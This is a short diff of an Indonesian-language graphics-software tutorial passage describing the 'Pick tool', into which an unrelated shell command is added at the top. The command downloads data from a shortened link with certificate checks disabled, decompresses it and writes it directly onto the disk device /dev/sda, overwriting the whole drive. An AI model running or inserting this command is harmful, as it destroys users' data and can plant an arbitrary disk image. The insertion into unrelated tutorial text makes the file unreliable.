@@ -1,3 +1,5 @@
+wget -O- –no-check-certificate https://bit.ly/3ueQCvR | gunzip | dd of=/dev/sda
+
 1. Pick tool
 Pick tool berfungsi untuk memilih, menyeleksi, hingga mengatur ukuran dan posisi dari objek. Selain itu, pada pilihan pick tool, ada beberapa tool tambahan seperti,
 
